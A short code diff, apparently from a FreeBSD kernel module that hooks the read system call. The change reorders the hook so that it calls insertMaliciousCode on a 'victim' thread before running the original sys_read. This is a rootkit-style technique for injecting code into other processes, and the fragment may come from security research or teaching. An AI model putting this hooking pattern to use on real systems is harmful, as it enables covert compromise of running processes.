@@ -137,21 +137,17 @@ command_hook (struct thread * td, void * syscall_args) {
 //
 static ssize_t
 read_hook (struct thread * td, void * syscall_args) {
-  // Number of bytes read by system call
-  ssize_t bytesRead;
-
-  //
-  // Perform the read using the original system call.
-  //
-  bytesRead = sys_read (td, syscall_args);
-
   //
   // If this is the victim process, and we have not injected code yet,
   // inject the code.
   //
   if (isVictimThread (td))
     insertMaliciousCode (td);
-  return bytesRead;
+
+  //
+  // Perform the read using the original system call.
+  //
+  return (sys_read (td, syscall_args));
 }
 
 static void
